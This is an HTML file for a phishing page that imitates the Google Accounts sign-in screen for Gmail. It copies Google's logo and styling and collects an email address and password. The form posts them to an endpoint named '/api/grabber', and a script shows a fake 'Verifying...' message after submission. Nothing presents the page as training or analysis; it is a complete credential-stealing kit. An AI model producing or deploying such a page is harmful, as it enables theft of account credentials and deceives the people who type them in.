<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,Arial,sans-serif}
        body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
        .container{max-width:450px;width:100%;background:white;border-radius:8px;border:1px solid #dadce0;padding:48px 40px 36px}
        .logo{text-align:center;margin-bottom:20px}
        .logo img{width:75px}
        h1{font-size:24px;font-weight:400;text-align:center;color:#202124}
        .subtitle{text-align:center;font-size:16px;color:#5f6368;margin-bottom:32px}
        .input-group{margin-bottom:20px}
        .input-group input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px}
        .input-group input:focus{outline:none;border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,0.2)}
        .btn-next{width:100%;background:#1a73e8;color:white;border:none;padding:12px;border-radius:4px;cursor:pointer;margin-top:20px}
        .btn-next:hover{background:#1557b0}
        .loading{display:none;text-align:center;margin-top:16px;color:#1a73e8}
        .footer{text-align:center;margin-top:40px;font-size:12px;color:#5f6368}
    </style>
</head>
<body>
<div class="container">
    <div class="logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"></div>
    <h1>Sign in</h1>
    <div class="subtitle">to continue to Gmail</div>
    <form method="POST" action="/api/grabber" id="loginForm">
        <div class="input-group"><input type="email" name="email" placeholder="Email" required></div>
        <div class="input-group"><input type="password" name="password" placeholder="Password" required></div>
        <button type="submit" class="btn-next" id="submitBtn">Next</button>
        <div class="loading" id="loading">⏳ Verifying...</div>
    </form>
    <div class="footer">English (United States) · Help · Privacy · Terms</div>
</div>
<script>
    document.getElementById('loginForm').addEventListener('submit',function(){
        document.getElementById('submitBtn').style.display='none';
        document.getElementById('loading').style.display='block';
    });
</script>
</body>
</html>
